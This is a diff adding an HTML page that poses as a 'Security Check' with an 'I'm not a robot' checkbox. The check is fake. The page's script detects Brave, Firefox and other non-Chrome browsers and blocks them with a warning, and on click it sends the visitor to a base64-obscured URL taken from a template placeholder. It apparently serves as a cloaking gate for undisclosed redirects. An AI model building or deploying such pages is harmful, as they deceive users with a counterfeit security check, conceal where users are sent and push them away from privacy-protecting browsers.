@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0d1117;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .box {
+            background-color: #161b22;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            text-align: center;
+            max-width: 380px;
+            width: 90%;
+            border: 1px solid #30363d;
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #21262d;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 20px 0;
+            cursor: pointer;
+            border: 1px solid #484f58;
+            transition: 0.2s;
+        }
+        .checkbox-container:hover {
+            background: #30363d;
+        }
+        .checkbox {
+            width: 22px;
+            height: 22px;
+            margin-right: 12px;
+            cursor: pointer;
+        }
+        .text {
+            font-size: 16px;
+            font-weight: bold;
+        }
+        #status {
+            color: #58a6ff;
+            font-size: 14px;
+            margin-top: 15px;
+            display: none;
+        }
+        #warningBox {
+            display: none;
+            background-color: #3d1214;
+            border: 1px solid #f85149;
+            color: #ff7b72;
+            padding: 15px;
+            border-radius: 6px;
+            margin-top: 15px;
+            font-size: 14px;
+            line-height: 1.5;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>  Security Check</h2>
+        <p style="color: #8b949e; font-size: 14px;">Please verify that you are not a robot to proceed.</p>
+        
+        <div id="warningBox">
+            <b>  Browser Not Allowed!</b><br>
+            Brave, Firefox, and Bypass extensions are strictly prohibited.<br><br>
+            Please copy this link and open it strictly in <b>Google Chrome</b> to continue.
+        </div>
+
+        <div class="checkbox-container" id="verifyBox">
+            <input type="checkbox" id="robotCheck" class="checkbox">
+            <span class="text">I'm not a robot</span>
+        </div>
+        
+        <div id="status">  Verifying browser... Please wait...</div>
+    </div>
+
+    <script>
+        async function checkBrowser() {
+            let userAgent = navigator.userAgent;
+            let isFirefox = userAgent.indexOf("Firefox") > -1;
+            let isBrave = (navigator.brave && await navigator.brave.isBrave()) || false;
+            let isEdge = userAgent.indexOf("Edg") > -1;
+            let isOpera = userAgent.indexOf("OPR") > -1 || userAgent.indexOf("Opera") > -1;
+            let isChrome = userAgent.indexOf("Chrome") > -1 && !isBrave && !isEdge && !isOpera;
+
+            if (isBrave || isFirefox || !isChrome) {
+                document.getElementById('verifyBox').style.display = 'none';
+                document.getElementById('warningBox').style.display = 'block';
+                return false;
+            }
+            return true;
+        }
+
+        checkBrowser();
+
+        document.getElementById('verifyBox').addEventListener('click', async function() {
+            let allowed = await checkBrowser();
+            if (!allowed) return;
+
+            let check = document.getElementById('robotCheck');
+            check.checked = true;
+            document.getElementById('status').style.display = 'block';
+            
+            setTimeout(function() {
+                try {
+                    let target = atob("{{CODE}}");
+                    window.location.href = target;
+                } catch(e) {
+                    alert("Error redirecting. Invalid link.");
+                }
+            }, 1200);
+        });
+    </script>
+</body>
+</html>
